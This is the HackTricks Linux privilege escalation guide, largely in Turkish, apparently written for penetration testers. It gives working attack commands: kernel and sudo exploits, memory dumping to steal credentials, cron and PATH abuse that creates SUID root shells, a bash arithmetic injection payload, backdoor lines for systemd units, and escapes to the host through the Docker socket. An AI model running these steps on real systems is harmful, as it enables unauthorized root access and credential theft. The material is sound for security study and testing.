# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgisi

### OS bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkenindeki herhangi bir klasörde yazma iznine sahipseniz** bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgisi

Ortam değişkenlerinde ilginç bilgiler, şifreler veya API keys var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Çekirdek sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığına bakın
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir zafiyetli kernel listesi ve bazı önceden **compiled exploits** şurada bulunabilir: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Diğer sitelerden bazı **compiled exploits** bulabilirsiniz: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O siteden tüm zafiyetli kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploit aramak için yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (kurban üzerinde çalıştırılmalı, yalnızca kernel 2.x için exploits kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen savunmasız sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün savunmasız olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1'den önceki Sudo sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**) yetkisiz yerel kullanıcıların sudo `--chroot` seçeneği aracılığıyla ayrıcalıklarını root'a yükseltmesine olanak tanır; bu durum, `/etc/nsswitch.conf` dosyası kullanıcı tarafından kontrol edilen bir dizinden kullanıldığında gerçekleşir.

O [vulnerability]'ı istismar etmek için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) mevcuttur. Exploit'i çalıştırmadan önce, `sudo` sürümünüzün zafiyetli olduğunu ve `chroot` özelliğini desteklediğini doğrulayın.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) belgesine bakın.

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu **smasher2 box of HTB**'de bu vuln'ün nasıl exploited edilebileceğine dair bir **örnek** var.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunma önlemleri

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Drives

Hangi şeylerin **mounted ve unmounted** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey **unmounted** ise, onu **mount** etmeyi deneyebilir ve gizli bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Yararlı yazılımlar

Yararlı binaries'leri listeleme
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca **herhangi bir compiler'ın kurulu olup olmadığını** kontrol edin. Bu, bazı kernel exploit'lerini kullanmanız gerekirse faydalıdır; çünkü bunları kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zafiyetli Yazılımlar Yüklü

**Yüklü paketlerin ve servislerin sürümlerini** kontrol edin. Belki örneğin eski bir Nagios sürümü ayrıcalık yükseltmek için istismar edilebilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Bu komutlar çoğunlukla işe yaramaz derecede çok bilgi gösterecektir; bu nedenle kurulu herhangi bir yazılım sürümünün bilinen exploits'e karşı zafiyetli olup olmadığını kontrol edecek OpenVAS veya benzeri bazı uygulamalar önerilir_

## Processes

Take a look at **what processes** are being executed and check if any process has **more privileges than it should** (maybe a tomcat being executed by root?)
```bash
ps aux
ps -ef
top -n 1
```
Her zaman olası [**electron/cef/chromium debuggers** çalışıyor olabilir, bunları ayrıcalık yükseltmek için kötüye kullanabilirsiniz](electron-cef-chromium-debugger-abuse.md). **Linpeas**, bunları işlemin komut satırındaki `--inspect` parametresini kontrol ederek tespit eder.\
Ayrıca **process binary'leri üzerindeki ayrıcalıklarınızı kontrol edin**, belki birini overwrite edebilirsiniz.

### İşlem izleme

İşlemleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sıkça çalıştırılan veya belirli gereksinimler karşılandığında çalıştırılan zayıf süreçleri tespit etmek için çok faydalı olabilir.

### İşlem belleği

Bazı sunucu servisleri **kimlik bilgilerini belleğin içinde açık metin olarak saklar**.\
Normalde diğer kullanıcılara ait süreçlerin belleğini okumak için **root ayrıcalıkları** gerekir, bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha faydalıdır.\
Ancak, unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makine **varsayılan olarak ptrace'e izin vermez**, bu da yetkisiz kullanıcınıza ait diğer süreçleri dump edemeyeceğiniz anlamına gelir.
>
> Dosya _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: tüm süreçler aynı uid'ye sahip olduğu sürece debug edilebilir. Bu ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: yalnızca bir ebeveyn süreç debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: yalnızca admin ptrace kullanabilir, çünkü CAP_SYS_PTRACE yeteneği gereklidir.
> - **kernel.yama.ptrace_scope = 3**: hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptrace'i yeniden etkinleştirmek için reboot gereklidir.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa Heap'i elde edip içindeki kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID için, **maps**, belleğin o işlemin sanal adres alanında nasıl eşlendiğini gösterir; ayrıca her eşlenen bölgenin **izinlerini** de gösterir. **mem** pseudo dosyası işlemin belleğinin kendisini açığa çıkarır. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve offset'lerini biliriz. Bu bilgiyi kullanarak **mem** dosyasında seek yapar ve okunabilir tüm bölgeleri bir dosyaya dökeriz.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. kernel'in sanal adres alanına /dev/kmem kullanılarak erişilebilir.\\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubunca okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış bir versiyonudur. Edinin: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlemin belleğini dump etmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Manuel olarak root gereksinimlerini kaldırıp size ait olan işlemi dump edebilirsiniz
- Script A.5 şu kaynaktan: [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

authenticator işlemi çalışıyorsa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilirsiniz (process belleğini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve bellek içinde kimlik bilgilerini arayın:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) will **steal clear text credentials from memory** and from some **well known files**. It requires root privileges to work properly.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Masaüstü, Debian Masaüstü)     | gdm-password         |
| Gnome Keyring (Ubuntu Masaüstü, ArchLinux Masaüstü) | gnome-keyring-daemon |
| LightDM (Ubuntu Masaüstü)                         | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Aktif HTTP Temel Kimlik Doğrulama Oturumları) | apache2              |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)   | sshd:                |

#### Arama Regex'leri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) root olarak çalışıyorsa – web tabanlı scheduler privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, SSH local port-forwarding ile yine de ona ulaşabilir ve ayrıcalıklı bir görev oluşturarak privesc gerçekleştirebilirsiniz.

Tipik zincir
- Loopback'e özel portu (örn., 127.0.0.1:8000) ve Basic-Auth realm'i şu komutlarla keşfedin: `ss -ntlp` / `curl -v localhost:8000`
- Kimlik bilgilerini operasyonel artefaktlarda bulun:
  - Yedekler/skriptler (`zip -P <password>` ile)
  - systemd unit'ı `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` değerlerini açığa çıkarıyor
- Tünelle bağlan ve giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- High-priv job oluşturun ve hemen çalıştırın (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullan:
```bash
/tmp/rootshell -p   # root shell
```
Güçlendirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcıyla ve en az izinle sınırlandırın
- localhost'a bağlayın ve erişimi ek olarak firewall/VPN ile kısıtlayın; parolaları yeniden kullanmayın
- unit files içine secret gömmekten kaçının; secret stores veya yalnızca root erişimli EnvironmentFile kullanın
- İstek üzerine çalışan job yürütmeleri için audit/logging'i etkinleştirin



Herhangi bir scheduled job'ın zafiyeti olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i şu şekilde bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Dikkat edin: "user" kullanıcısının /home/user üzerinde yazma ayrıcalıkları var_)

Bu crontab içinde root kullanıcısı PATH'i ayarlamadan bazı komutları veya scriptleri çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\

Böylece şu komutla root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, wildcard içeren bir script kullanıyorsa (Wildcard Injection)

Eğer root tarafından çalıştırılan bir script bir komut içinde “**\***” içeriyorsa, bunu beklenmedik şeyler yapmak (ör. privesc) için istismar edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard bir yolun önünde yer alıyorsa, örneğin** _**/some/path/\***_ **, zafiyetli değildir (hatta** _**./\***_ **de değildir).**

Daha fazla wildcard exploitation hilesi için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içinde aritmetik değerlendirmeden önce parameter expansion ve command substitution uygular. Eğer bir root cron/parser güvensiz log alanlarını okuyup bunları bir aritmetik bağlama aktarıyorsa, saldırgan $(...) biçiminde bir command substitution enjekte edebilir; cron çalıştığında bu root olarak yürütülür.

- Neden işe yarar: Bash'te genişletmeler şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, sonra word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), ardından kalan sayısal `0` aritmetikte kullanılır ve script hatasız devam eder.

- Tipik zafiyetli örüntü:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- İstismar: Parse edilen log'a saldırgan kontrollü metin yazdırın, böylece sayısal görünen alan bir command substitution içerir ve bir rakamla biter. Komutunuz stdout'a yazdırmamalı (veya çıktıyı yönlendirmelisiniz) ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **tam erişiminiz olan bir directory** kullanıyorsa, o klasörü silip **sizin kontrolünüzde bir script sunan başka bir klasöre symlink oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık cron jobs

Süreçleri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri arayabilirsiniz. Belki bundan yararlanıp escalate privileges yapabilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izlemek**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu başlayan her işlemi izleyecek ve listeleyecektir).

### Görünmez cron jobs

Yorumdan sonra (yeni satır karakteri olmadan) **bir carriage return koyarak** cronjob oluşturmak mümkündür ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat edin):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyası yazıp yazamayacağınızı kontrol edin; yazabiliyorsanız, **onu değiştirebilir** ve servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** backdoor'unuzun **çalıştırılmasını** sağlayabilirsiniz (belki makinenin yeniden başlatılmasını beklemeniz gerekir).\
Örneğin .service dosyası içine backdoor'unuzu şu satırla oluşturun: **`ExecStart=/tmp/script.sh`**

### Yazılabilir servis ikili dosyaları

Unutmayın ki **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma izinlerine** sahipseniz, bunları backdoor'lar için değiştirebilir ve servisler yeniden çalıştırıldığında backdoor'ların da çalışmasını sağlayabilirsiniz.

### systemd PATH - Relative Paths

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Yol üzerindeki klasörlerin herhangi birine **yazabiliyorsanız**, **escalate privileges** mümkün olabilir. Aşağıdaki gibi **servis yapılandırma dosyalarında kullanılan göreli yolları** aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörünün içinde, göreli yol ikili dosyasıyla aynı ada sahip bir **çalıştırılabilir** oluşturun ve servis savunmasız eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **arka kapınız çalıştırılacak** (ayrıcalıksız kullanıcılar genellikle servisleri başlatamazlar/durduramazlar ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service`'e bakın.**

## **Zamanlayıcılar**

**Timers** systemd unit dosyalarıdır; adı `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden birimlerdir. **Zamanlayıcılar**, takvim zaman olayları ve monotonik zaman olayları için yerleşik desteğe sahip olmaları ve eşzamansız olarak çalıştırılabilmeleri nedeniyle cron'un bir alternatifi olarak kullanılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir timer birimleri

Bir timer'ı değiştirebiliyorsanız, systemd.unit içindeki bazı mevcut birimleri (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şöyle açıklanıyor:

> Bu timer süresi dolduğunda etkinleştirilecek unit. Argüman, son eki not ".timer" olan bir unit adıdır. Belirtilmezse, bu değer varsayılan olarak timer unit ile aynı ada sahip, sadece son eki farklı olan bir service olur. (Yukarıya bakın.) Etkinleştirilecek unit adı ile timer unit adının, son ek hariç olmak üzere, aynı isimde olması önerilir.

Bu nedenle, bu izni kötüye kullanmak için şunlara ihtiyacınız olur:

- Bazı systemd unit'leri (ör. `.service`) bulun; bunlardan biri **yazılabilir bir binary çalıştırıyor**
- **Göreli bir yolu çalıştıran** bir systemd unit bulun ve **systemd PATH** üzerinde **yazma yetkisine** sahip olun (o çalıştırılabilir dosyayı taklit etmek için)

**timer'lar hakkında daha fazlasını `man systemd.timer` ile öğrenin.**

### **Timer Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına ihtiyacınız var ve şu komutu çalıştırmalısınız:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Dikkat: **timer**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` üzerine ona bir symlink oluşturarak **etkinleştirilir**

## Soketler

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makineler arasında **proses iletişimi** sağlar. Bilgisayarlar arası iletişim için standart Unix dosya tanımlayıcılarını kullanırlar ve `.socket` dosyalarıyla yapılandırılırlar.

Soketler `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında daha fazla bilgi için `man systemd.socket`'a bakın.** Bu dosya içinde birkaç ilginç parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak özetle soketin nerede dinleyeceğini **belirtmek için** kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance başlatılır** ve yalnızca bağlantı soketi ona geçirilir. Eğer **false** ise, tüm dinleme soketleri **başlatılan service unit'e geçirilir** ve tüm bağlantılar için yalnızca bir service unit başlatılır. Bu değer, tek bir service unit'un koşulsuz olarak tüm gelen trafiği işlediği datagram soketleri ve FIFO'lar için dikkate alınmaz. **Varsayılan false'tur**. Performans nedenleriyle, yeni daemon'ların sadece `Accept=no` için uygun şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar sırasıyla dinleme **soketler**/FIFO'lar **oluşturulup** bağlanmadan **önce** veya **sonra** **çalıştırılır**. Komut satırının ilk token'i mutlak bir dosya adı olmalı, ardından işlem için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **soketler**/FIFO'lar **kapatılmadan** ve kaldırılmadan **önce** veya **sonra** **çalıştırılan** ek **komutlar**.
- `Service`: Gelen trafik üzerinde **aktive edilecek** **service** unit adını belirtir. Bu ayar yalnızca Accept=no olan soketler için izinlidir. Varsayılan olarak soketle aynı ada sahip (sonek değiştirilmiş) service kullanılır. Çoğu durumda bu seçeneği kullanmak gerekli değildir.

### Yazılabilir .socket dosyaları

Eğer **yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına şu gibi bir satır **ekleyebilirsiniz**: `ExecStartPre=/home/kali/sys/backdoor` ve backdoor socket oluşturulmadan önce çalıştırılacaktır. Bu nedenle **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\ _Sistemin bu .socket dosyası yapılandırmasını kullanıyor olması gerekir, aksi halde backdoor çalıştırılmaz_

### Yazılabilir soketler

Eğer herhangi bir **yazılabilir soket** tespit ederseniz (_burada artık konfigürasyon `.socket` dosyalarından değil Unix Soketlerinden bahsediyoruz_), o soketle **iletişim kurabilir** ve belki bir zafiyeti istismar edebilirsiniz.

### Unix Soketlerini Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

HTTP isteklerini dinleyen bazı **sockets** olabilir (_.socket files değil, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket **HTTP isteğine cevap veriyorsa**, onunla **iletişim kurabilir** ve belki de **exploit some vulnerability**.

### Yazılabilir Docker Socket

Docker socket, genellikle `/var/run/docker.sock` konumunda bulunur ve korunması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket'e yazma erişimi sahibi olmak privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceği ve Docker CLI mevcut değilse alternatif yöntemlerin bir dökümü bulunmaktadır.

#### **Privilege Escalation with Docker CLI**

Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar host'un dosya sistemine root düzeyinde erişim ile bir container çalıştırmanızı sağlar.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI mevcut olmadığında, Docker socket hâlâ Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir image'ların listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin kök dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container'a bağlantı kurun; bu, içinde komut çalıştırmanızı sağlar.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
